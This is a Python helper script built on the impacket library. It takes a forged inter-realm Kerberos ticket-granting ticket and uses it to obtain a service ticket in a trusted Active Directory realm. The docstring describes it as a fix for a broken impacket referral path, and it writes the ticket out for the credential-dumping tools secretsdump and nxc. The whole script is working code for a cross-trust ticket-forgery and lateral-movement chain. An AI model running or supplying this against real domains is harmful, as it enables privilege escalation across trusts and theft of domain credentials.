#!/usr/bin/env python3
"""Request a TGS using a cross-realm (inter-realm) TGT.

Workaround for impacket #315: getST/SMB cross-realm referral is broken because
``CCache.parseFile`` and ``getST.run`` only look up ``krbtgt/<DOMAIN>@<DOMAIN>``
(a regular intra-realm TGT) when ``-k -no-pass`` is given. A forged inter-realm
TGT has server ``krbtgt/<TARGET>@<SOURCE>``, so it is silently ignored and
getST falls through to a no-pass authentication that fails with
``KDC_ERR_WRONG_REALM`` (and exit 0, hiding the failure).

This helper loads the cross-realm TGT directly out of the input ccache, calls
``getKerberosTGS`` against the target realm's KDC, and writes the resulting TGS
to a new ccache that ``nxc`` / ``secretsdump`` consume via ``KRB5CCNAME``.
"""

import argparse
import sys

from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGS
from impacket.krb5.types import Principal


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--in-ccache", required=True, help="ccache containing the cross-realm TGT")
    p.add_argument("--out-ccache", required=True, help="ccache to write resulting TGS to")
    p.add_argument("--spn", required=True, help="service SPN, e.g. cifs/dc.target.local")
    p.add_argument("--source-realm", required=True, help="realm where the TGT was issued")
    p.add_argument("--target-realm", required=True, help="realm of the SPN")
    p.add_argument("--target-kdc", required=True, help="target realm KDC IP/host to send TGS-REQ to")
    p.add_argument(
        "--append",
        action="store_true",
        help="if --out-ccache exists, load it and merge the new TGS into it (preserves the inter-realm TGT and any prior service tickets)",
    )
    args = p.parse_args()

    src_realm = args.source_realm.upper()
    tgt_realm = args.target_realm.upper()

    in_cc = CCache.loadFile(args.in_ccache)
    if in_cc is None:
        print(f"[!] failed to load {args.in_ccache}", file=sys.stderr)
        return 2

    cross_principal = f"krbtgt/{tgt_realm}@{src_realm}"
    creds = in_cc.getCredential(cross_principal, anySPN=False)
    if creds is None:
        print(f"[!] no cross-realm TGT for {cross_principal} in {args.in_ccache}", file=sys.stderr)
        return 3

    tgt = creds.toTGT()
    server = Principal(args.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

    print(
        f"[*] requesting TGS for {args.spn} from {args.target_kdc} ({tgt_realm})",
        file=sys.stderr,
    )
    # getKerberosTGS returns (tgs_rep, cipher, tgt_session_key, new_session_key).
    # tgt_session_key decrypts the TGS-REP enc-part (key usage 8); new_session_key
    # is the application key inside the TGS. fromTGS expects (tgs, oldKey, newKey).
    tgs, _cipher, tgt_session_key, new_session_key = getKerberosTGS(
        server,
        tgt_realm,
        args.target_kdc,
        tgt["KDC_REP"],
        tgt["cipher"],
        tgt["sessionKey"],
    )

    import os
    if args.append and os.path.exists(args.out_ccache):
        out = CCache.loadFile(args.out_ccache) or CCache()
        scratch = CCache()
        scratch.fromTGS(tgs, tgt_session_key, new_session_key)
        for cred in scratch.credentials:
            out.credentials.append(cred)
        if out.principal is None and scratch.principal is not None:
            out.principal = scratch.principal
        out.saveFile(args.out_ccache)
    else:
        out = CCache()
        out.fromTGS(tgs, tgt_session_key, new_session_key)
        out.saveFile(args.out_ccache)
    print(f"[+] wrote TGS to {args.out_ccache}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
